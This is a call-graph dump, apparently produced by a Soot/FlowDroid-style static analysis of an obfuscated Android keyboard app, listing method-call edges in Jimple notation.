STATIC edge: $r4 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i0, $i1, 0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "log site key") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
CLINIT edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>
CLINIT edge: staticinvoke <lnd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lnd: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivv: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: $r12 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r24.<lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>($r21, $r6, $r22) in <lsd: boolean b(lsr)> ==> <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<lfb: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfb: void <init>(lfa)>
SPECIAL edge: specialinvoke $r6.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<hns: void <init>()>() in <hnt: void <clinit>()> ==> <hns: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int ordinal()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <ivw: ivw g(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getKey()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(5) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqn: lkq f()>
SPECIAL edge: specialinvoke r0.<lim: void <init>()>() in <llo: void <init>(lkx,int)> ==> <lim: void <init>()>
STATIC edge: $r8 = staticinvoke <ivw: ivw d(java.util.Locale)>($r9) in <ivw: void <clinit>()> ==> <ivw: ivw d(java.util.Locale)>
CLINIT edge: staticinvoke <coo: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <coo: void <clinit>()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <j$.util.concurrent.ConcurrentHashMap: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <ivw: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r4, $i4, $i5) in <nzh: boolean f(ivv)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<qj: void <init>(int)>(0) in <qj: void <init>()> ==> <qj: void <init>(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: int n(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<mag: void <init>(java.lang.String,int,int)>("STICKER_JSON", 1, 1) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean isEmpty()>() in <ivv: ivw i(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Unrecognized language tag") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("ExpressiveStickerMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r3 = virtualinvoke $r4.<ltc: java.lang.String toString()>() in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Enum: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String d()>
SPECIAL edge: specialinvoke $r0.<java.util.concurrent.atomic.AtomicReference: void <init>()>() in <bel: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicReference: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lql: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r7.<java.util.Set: java.util.Iterator iterator()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.e: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwc: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r2.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_METADATA", 2, 2) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r28 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "sizeCtl") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("rnd", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: $i4 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int e()>
SPECIAL edge: specialinvoke $r1.<lpi: void <init>(java.lang.String,int)>("VALUE", 1) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(14) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean A(char)>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lrg: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int b()>() in <lvq: java.lang.Object c(int)> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>("theUnsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r7, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
INTERFACE edge: interfaceinvoke $r10.<java.util.List: boolean add(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
CLINIT edge: staticinvoke <ltc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltc: void <clinit>()>
STATIC edge: $r2 = staticinvoke <her: her k(miy)>($r1) in <her: void <clinit>()> ==> <her: her k(miy)>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int a(int)> ==> <java.lang.ThreadLocal: java.lang.Object get()>
SPECIAL edge: specialinvoke $r0.<gwk: void <init>()>() in <gwk: void <clinit>()> ==> <gwk: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i2, $i0, $i1) in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object k(int)>($i0) in <ljb: java.lang.Object getValue()> ==> <ljd: java.lang.Object k(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: int hashCode()>
STATIC edge: $r4 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r1, r0) in <lkt: lkx b(boolean)> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String e(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
STATIC edge: $i7 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/notificationcenter/ComponentsReadinessManager") in <iej: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getKey()>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("TenorSearchSuggestionMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<lsf: void <init>(lsh,java.util.logging.Level)>(r0, $r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsf: void <init>(lsh,java.util.logging.Level)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
STATIC edge: staticinvoke <izw: boolean D(java.util.Collection,java.util.Iterator)>($r1, $r0) in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <izw: boolean D(java.util.Collection,java.util.Iterator)>
SPECIAL edge: specialinvoke $r0.<java.lang.Object: void <init>()>() in <ljd: void <clinit>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>($i2) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
CLINIT edge: staticinvoke <java.util.logging.Level: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.logging.Level: void <clinit>()>
SPECIAL edge: specialinvoke r0.<liz: void b()>() in <liz: java.lang.Object next()> ==> <liz: void b()>
STATIC edge: $r22 = staticinvoke <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>(class "Llsn;", $i0) in <lsd: boolean b(lsr)> ==> <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t get the Unsafe") in <j$.sun.misc.b: void <clinit>()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r1, $r2, $z0, 1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void g(java.lang.Throwable,java.lang.String)>($r0, $r1) in <ojg: void h(java.lang.Throwable)> ==> <ojg: void g(java.lang.Throwable,java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r5.<java.text.SimpleDateFormat: java.lang.String format(java.util.Date)>($r3) in <lsc: void f(java.lang.String,ltn)> ==> <java.text.DateFormat: java.lang.String format(java.util.Date)>
STATIC edge: $r3 = staticinvoke <kes: java.lang.String k(nfe)>($r26) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/ImeLatinApp") in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("AndroidIME") in <hef: void <clinit>()> ==> <lth: lth i(java.lang.String)>
STATIC edge: $l0 = staticinvoke <lum: long b()>() in <lsn: void <init>(java.util.logging.Level)> ==> <lum: long b()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String d()>
VIRTUAL edge: $z2 = virtualinvoke $r1.<java.lang.String: boolean isEmpty()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: boolean isEmpty()>
CLINIT edge: staticinvoke <lqq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqq: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
CLINIT edge: staticinvoke <lvr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvr: void <clinit>()>
STATIC edge: $r1 = staticinvoke <izw: java.util.Collection at(java.lang.Iterable)>($r0) in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <izw: java.util.Collection at(java.lang.Iterable)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lma: int e(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<hbv: void j()>() in <hbv: boolean o()> ==> <hbv: void j()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw d(java.util.Locale)> ==> <ivw: ivv I()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "cellsBusy") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, 0, $r3) in <lqq: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
STATIC edge: $z1 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r2, $r1) in <hbv: void k(java.lang.Object,boolean)> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<androidx.core.content.FileProvider: void <init>()>() in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lqc: void <init>()> ==> <lqd: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int z(int,int,int,int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <ivw: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i5, $i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean x(int,int)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i2, 2) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Invalid subtag: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <nvw: void j(int[],int[],int,int,int)>($r4, $r4, $i0, $i3, $i1) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void j(int[],int[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.util.List: int size()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int f(java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r1.<ljb: void <init>(ljd,int)>($r2, $i0) in <liw: java.lang.Object a(int)> ==> <ljb: void <init>(ljd,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r2, $r3) in <lli: void c(java.util.Map$Entry)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
INTERFACE edge: $l0 = interfaceinvoke $r2.<ltn: long e()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: long e()>
